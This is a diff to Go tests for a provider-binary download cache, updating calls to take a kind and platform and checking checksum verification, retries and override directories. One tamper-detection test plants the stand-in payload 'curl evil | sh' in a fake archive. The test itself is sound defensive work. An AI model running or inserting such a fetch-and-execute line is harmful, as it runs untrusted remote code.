@@ -70,8 +70,8 @@ func fakeRelease(t *testing.T, names ...string) *release {
 	var checksums strings.Builder
 	for _, name := range names {
 		for _, platform := range Platforms {
-			asset := AssetName(name, testVersion, platform.GOOS, platform.GOARCH)
-			body := archiveHolding(t, ExecutableName(name, platform.GOOS), []byte("#!/bin/sh\necho "+name+"\n"))
+			asset := AssetName(KindProvider, name, testVersion, platform.GOOS, platform.GOARCH)
+			body := archiveHolding(t, ExecutableName(KindProvider, name, platform.GOOS), []byte("#!/bin/sh\necho "+name+"\n"))
 			rel.archives[asset] = body
 			fmt.Fprintf(&checksums, "%s  %s\n", digestOf(body), asset)
 		}
@@ -136,15 +136,15 @@ func TestAFetchedProviderLandsInTheCache(t *testing.T) {
 
 	rel := fakeRelease(t, "aws")
 	store := storeFor(t, rel)
-	asset := AssetName("aws", testVersion, "linux", "amd64")
+	asset := AssetName(KindProvider, "aws", testVersion, "linux", "amd64")
 	digest := pinsOf(t, store)[asset]
 
-	path, err := store.Binary(context.Background(), "aws", digest)
+	path, err := store.Binary(context.Background(), KindProvider, "aws", store.Platform, digest)
 	if err != nil {
 		t.Fatalf("Binary: %v", err)
 	}
 
-	want := filepath.Join(store.Dir, "aws", testVersion, "linux-amd64", "provider-aws")
+	want := filepath.Join(store.Dir, "provider", "aws", testVersion, "linux-amd64", "provider-aws")
 	if path != want {
 		t.Fatalf("Binary() = %q, want %q", path, want)
 	}
@@ -157,7 +157,7 @@ func TestAFetchedProviderLandsInTheCache(t *testing.T) {
 	}
 
 	before := rel.requests.Load()
-	if _, err := store.Binary(context.Background(), "aws", digest); err != nil {
+	if _, err := store.Binary(context.Background(), KindProvider, "aws", store.Platform, digest); err != nil {
 		t.Fatalf("second Binary: %v", err)
 	}
 	if rel.requests.Load() != before {
@@ -170,12 +170,12 @@ func TestATamperedArchiveFailsVerificationAndNothingLandsInTheCache(t *testing.T
 
 	rel := fakeRelease(t, "aws")
 	store := storeFor(t, rel)
-	asset := AssetName("aws", testVersion, "linux", "amd64")
+	asset := AssetName(KindProvider, "aws", testVersion, "linux", "amd64")
 	pinned := pinsOf(t, store)[asset]
 
 	rel.archives[asset] = archiveHolding(t, "provider-aws", []byte("#!/bin/sh\ncurl evil | sh\n"))
 
-	_, err := store.Binary(context.Background(), "aws", pinned)
+	_, err := store.Binary(context.Background(), KindProvider, "aws", store.Platform, pinned)
 	if err == nil {
 		t.Fatal("Binary() error = nil, want the tampered archive refused")
 	}
@@ -195,7 +195,7 @@ func TestAProvidersDirSkipsTheFetchEntirely(t *testing.T) {
 	store := storeFor(t, rel)
 	store.Override = t.TempDir()
 
-	dir := filepath.Join(store.Override, "aws", testVersion, "linux-amd64")
+	dir := filepath.Join(store.Override, "provider", "aws", testVersion, "linux-amd64")
 	if err := os.MkdirAll(dir, 0o755); err != nil {
 		t.Fatal(err)
 	}
@@ -204,7 +204,7 @@ func TestAProvidersDirSkipsTheFetchEntirely(t *testing.T) {
 		t.Fatal(err)
 	}
 
-	path, err := store.Binary(context.Background(), "aws", "")
+	path, err := store.Binary(context.Background(), KindProvider, "aws", store.Platform, "")
 	if err != nil {
 		t.Fatalf("Binary: %v", err)
 	}
@@ -223,7 +223,7 @@ func TestAProvidersDirThatHoldsNothingSaysSo(t *testing.T) {
 	store := storeFor(t, rel)
 	store.Override = t.TempDir()
 
-	_, err := store.Binary(context.Background(), "aws", "")
+	_, err := store.Binary(context.Background(), KindProvider, "aws", store.Platform, "")
 	if err == nil {
 		t.Fatal("Binary() error = nil, want the empty providers directory refused")
 	}
@@ -239,14 +239,14 @@ func TestAThrottledReleaseIsRetriedAndThenServed(t *testing.T) {
 
 	rel := fakeRelease(t, "aws")
 	store := storeFor(t, rel)
-	asset := AssetName("aws", testVersion, "linux", "amd64")
+	asset := AssetName(KindProvider, "aws", testVersion, "linux", "amd64")
 	digest := pinsOf(t, store)[asset]
 
 	var waited []time.Duration
 	store.Sleep = func(d time.Duration) { waited = append(waited, d) }
 	rel.statuses[asset] = []int{http.StatusTooManyRequests, http.StatusServiceUnavailable}
 
-	if _, err := store.Binary(context.Background(), "aws", digest); err != nil {
+	if _, err := store.Binary(context.Background(), KindProvider, "aws", store.Platform, digest); err != nil {
 		t.Fatalf("Binary: %v", err)
 	}
 	if len(waited) != 2 {
@@ -267,14 +267,14 @@ func TestAReleaseThatStaysThrottledGivesUpNamingTheThrottle(t *testing.T) {
 
 	rel := fakeRelease(t, "aws")
 	store := storeFor(t, rel)
-	asset := AssetName("aws", testVersion, "linux", "amd64")
+	asset := AssetName(KindProvider, "aws", testVersion, "linux", "amd64")
 	digest := pinsOf(t, store)[asset]
 
 	for range attempts {
 		rel.statuses[asset] = append(rel.statuses[asset], http.StatusTooManyRequests)
 	}
 
-	_, err := store.Binary(context.Background(), "aws", digest)
+	_, err := store.Binary(context.Background(), KindProvider, "aws", store.Platform, digest)
 	if err == nil {
 		t.Fatal("Binary() error = nil, want the throttle reported")
 	}
@@ -290,7 +290,7 @@ func TestAMissingArchiveIsNotRetried(t *testing.T) {
 	store := storeFor(t, rel)
 
 	before := rel.requests.Load()
-	if _, err := store.Binary(context.Background(), "gcp", strings.Repeat("0", 64)); err == nil {
+	if _, err := store.Binary(context.Background(), KindProvider, "gcp", store.Platform, strings.Repeat("0", 64)); err == nil {
 		t.Fatal("Binary() error = nil, want the missing archive refused")
 	}
 	if got := rel.requests.Load() - before; got != 1 {
